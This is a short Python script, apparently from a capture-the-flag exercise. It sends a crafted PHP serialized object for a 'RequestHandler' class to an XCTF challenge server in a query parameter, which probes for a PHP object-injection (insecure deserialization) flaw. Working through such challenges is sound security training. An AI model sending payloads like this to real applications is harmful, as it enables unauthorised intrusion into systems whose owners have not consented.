import requests
BASE = "http://web-1626f1ce50.challenge.xctf.org.cn/"
p = 'O:14:"RequestHandler":1:{s:6:"action";a:0:{}}'
r = requests.get(BASE, params={"p": p}, timeout=10)
print(r.text[:400])

